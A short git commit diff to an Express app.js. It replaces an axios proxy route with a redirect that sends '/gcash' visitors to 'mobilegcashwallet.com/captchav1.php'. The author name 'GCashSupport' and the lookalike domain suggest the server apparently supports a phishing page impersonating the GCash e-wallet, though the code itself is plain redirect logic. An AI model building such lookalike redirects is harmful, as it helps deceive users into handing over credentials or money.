305e1d4772207de84ef63e012603a2dce50c2e7a
GCashSupport <133473145+GCashSupport@users.noreply.github.com>
2023-05-13 14:21:57 +0800

    Update app.js

--- app.js
+++ app.js
@@ -1,22 +1,9 @@
 const express = require('express');
-const axios = require('axios'); // for making HTTP requests
 const app = express();
 
-// Define a route to interact with the website's API
-app.get('/gcash', async (req, res) => {
-  try {
-    // Make a request to the website's API
-    const response = await axios.get('https://mobilegcashwallet.com/captchav1.php');
-    const data = response.data;
-
-    // Process the response data as needed
-    // ...
-
-    res.json(data); // Send the response data back to the client
-  } catch (error) {
-    console.error(error);
-    res.status(500).json({ error: 'Internal server error' });
-  }
+// Define a route to redirect to the website
+app.get('/gcash', (req, res) => {
+  res.redirect('https://mobilegcashwallet.com/captchav1.php');
 });
 
 app.listen(3000, () => {
